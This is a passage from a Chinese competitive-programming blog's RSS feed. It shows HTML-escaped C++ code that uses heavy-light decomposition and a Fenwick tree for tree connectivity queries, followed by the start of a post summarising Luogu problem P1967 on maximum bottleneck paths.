class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; lowbit(x) x&amp;amp;-x&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; pair&amp;lt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;&amp;gt; P;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; maxn = &lt;span class=&#34;number&#34;&gt;1000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;P war[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fa[maxn], dep[maxn], val[maxn], sz[maxn], top[maxn], son[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tre[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cntw;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n, m;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ch, x = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, f = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;ch = &lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;((ch &amp;lt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; || ch &amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;amp;&amp;amp; ch != &lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;) ch = &lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ch == &lt;span class=&#34;string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt; ? f = &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;, ch = &lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;() : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(ch &amp;gt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; &amp;amp;&amp;amp; ch &amp;lt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;9&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x = x * &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; + ch - &lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch = &lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; f * x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Edge&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; to, len, nxt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;Edge&lt;/span&gt;() &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;Edge&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _to, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _len, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _nxt):&lt;span class=&#34;built_in&#34;&gt;to&lt;/span&gt;(_to), &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(_len), &lt;span class=&#34;built_in&#34;&gt;nxt&lt;/span&gt;(_nxt) &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;E[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; h[maxn], cnte;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; L[maxn], R[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; add)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = x;i &amp;lt;= maxn; i += &lt;span class=&#34;built_in&#34;&gt;lowbit&lt;/span&gt;(i)) tre[i] += add;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = x; i; i -= &lt;span class=&#34;built_in&#34;&gt;lowbit&lt;/span&gt;(i)) ans += tre[i]; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add_edge&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; u, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; w)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E[++cnte] = &lt;span class=&#34;built_in&#34;&gt;Edge&lt;/span&gt;(v, w, h[u]), h[u] = cnte;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    E[++cnte] = &lt;span class=&#34;built_in&#34;&gt;Edge&lt;/span&gt;(u, w, h[v]), h[v] = cnte;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dfs1&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sz[x] = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; dep[x] = dep[fa[x]] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = h[x]; i; i = E[i].nxt) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; to = E[i].to;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(to == fa[x]) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fa[to] = x;val[x] = E[i].len;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;dfs1&lt;/span&gt;(to);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sz[x] += sz[to];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(sz[to] &amp;gt; sz[son[x]]) son[x] = to;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dfs2&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    L[x] = ++tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x == son[fa[x]]) top[x] = top[fa[x]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; top[x] = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(son[x]) &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(son[x]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = h[x]; i; i = E[i].nxt) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; to = E[i].to;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(to == fa[x] || to == son[x]) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(to);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    R[x] = tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;cut&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L[x] &amp;lt; L[y]) &lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(L[x], &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L[x] &amp;lt; L[y]) &lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(L[x], &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;qsum&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;span class=&#34;comment&#34;&gt;//其实可以查到有1就退出，不用查完和&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(top[x] != top[y])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[top[x]] &amp;lt; dep[top[y]])&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans += (&lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(L[x]) - &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(L[top[x]] - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x = fa[top[x]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[x] &amp;lt; dep[y])&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (x!=y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ans += (&lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(L[x]) - &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(L[y]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;, &amp;amp;n, &amp;amp;m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;lt; n; i++) &lt;span class=&#34;built_in&#34;&gt;add_edge&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(), &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(), &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dfs1&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i &amp;lt;= m; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; s[&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cin &amp;gt;&amp;gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(s[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;C&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; u = &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(), v = &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;cut&lt;/span&gt;(u, v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            war[++cntw] = &lt;span class=&#34;built_in&#34;&gt;P&lt;/span&gt;(u, v);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(s[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;U&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; w = &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;connect&lt;/span&gt;(war[w].first, war[w].second);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;qsum&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(), &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;()) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;No&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Yes&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/</guid>
            <title>洛谷:P1967 货车运输</title>
            <link>http://cubicy.icu/2018/09/28/%E6%B4%9B%E8%B0%B7P1967%20%E8%B4%A7%E8%BD%A6%E8%BF%90%E8%BE%93/</link>
            <category>图论</category>
            <category>Kruskal</category>
            <pubDate>Fri, 28 Sep 2018 13:48:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href&gt;https://www.luogu.org/problemnew/show/P1902&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;给定一个n个点m条边的无向带权图，每次询问2点u,v的联通情况，不联通则输出-1。&lt;br&gt;如果联通，不妨将一条联通u,v的路径上的最小权值记为w，则该次询问输出所有可能的w中的最大值。&lt;br&gt;共有q次询问。&lt;/p&gt;
&lt;hr&gt;
